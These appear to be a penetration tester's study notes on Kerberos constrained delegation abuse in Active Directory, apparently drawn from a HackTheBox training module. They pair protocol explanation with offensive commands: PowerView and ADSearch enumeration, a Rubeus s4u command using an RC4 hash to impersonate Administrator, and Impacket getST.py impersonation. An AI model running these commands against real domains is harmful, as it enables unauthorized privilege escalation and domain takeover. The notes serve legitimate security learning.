

# Theory

Constrained delegation was first introduced with Windows Server 2003 and it was intended to restrict the services that a server can impersonate a user for, giving administrators the ability to specify application trust boundaries. 

An example of constrained delegation is a researcher logging in to a reporting application. When the user logs in, the backend database server must apply the researcher's database permissions, not the permissions of the service account that the application runs under. To accomplish this, the service account needs Kerberos-constrained delegation enabled so that the user's Kerberos ticket is used to access the database when the researcher logs in. In this example, the front-end web server is impersonating the user to the backend database, providing them access to only the data they can view or edit.

## Windows


```powershell

Import-Module .\PowerView.ps1

Get-DomainComputer -TrustedToAuth

powerpick Get-DomainComputer -TrustedToAuth | select cn, msdsallowedtodelegateto
```



```python
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:www/WS01.inlanefreight.local /altservice:HTTP /user:DMZ01$ /rc4:ff955e93a130f5bb1a6565f32b7dc127 /pt
```


### Protocol transition 

```powershell
Import-Module .\PowerView.ps1

Get-DomainComputer -TrustedToAuth

powerpick Get-DomainComputer -TrustedToAuth | select cn, msdsallowedtodelegateto
```


```python
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json
```


## Linux

```
findDelegation.py DOMAIN.LOCAL/USERNAME:'password'@<IP_ADDRESS>
```

```
getST.py -spn TERMSRV/FQDN.DOMAIN.LOCAL 'INLANEFREIGHT.LOCAL/USERNAME:'password' -impersonate Administrator
```

```

```


# S4UFuckery



## S4U2self

- remember that S4U2Self abuse works regardless of delegation protection, this is due to the fact that S4U2Self is a authorization protocol which is not tied exclusively to delegations

## S4U2Proxy

- unlike S4U2Self, S4U2Proxy is tied to delegations when changing a SPN for the user. 


- S4U2self bypasses protected users
	- which makes sense because the s4u2proxy is whats exclusive to delegations
- ldap is the best way to test SPN issues
	- if yes then spn is the issue
	- if no then spn isnt the issue




----


Breaking down the AP-REQ made by the user to the service.

![image](https://academy.hackthebox.com/storage/modules/25/NEW_ap_req_message_green.png)


the AP-REQ contains 2 parts

- authenticator
- The TGS; is also composed of 2 more parts
	- an **unencrypted** part containing the SPN of the requested service
		- because this is not encrypted an attacker can modify the SPN without invalidating the ticket
	- encrypted part containing the users information and a Session key

In KCD if an attacker is allowed to compromise a service account then they can relay received authentication attempts to one or more SPNs in the list.

### The entire scenario played out:

To do so, the attacker will use the `S4U2Proxy` extension because it will allow them to obtain a valid TGS ticket on behalf of the user. The attacker, therefore, has a valid TGS ticket for a specific SPN destined for a particular service account. However, the attacker won't be able to use this TGS ticket towards a different service account since the content of the TGS ticket is encrypted with the key of the requested service. Another service account will not be able to decrypt the TGS ticket or Service Ticket (ST).

for example if we own a machine account which has access to the SQL SPN we can modify the AP-REQ to then access all of the other services that could be offered like CIFS for example.






# References

https://www.perplexity.ai/search/explain-to-me-please-how-does-0F6NlGp9SW.R4S0pjnRl3A#5
https://blog.harmj0y.net/activedirectory/s4u2pwnage/
https://learn.microsoft.com/en-us/previous-versions/msp-n-p/ff649317(v=pandp.10)?redirectedfrom=MSDN
https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/8ee85a47-7526-4184-a7c5-25a5e4155d7d?redirectedfrom=MSDN
https://eladshamir.com/2019/01/28/Wagging-the-Dog.html
https://www.compass-security.com/fileadmin/Research/Presentations/2025_05_Kerberos_Deep_Dive_P5_Constrained_Delegation.pdf
https://www.youtube.com/watch?v=rnhr02eKU0I

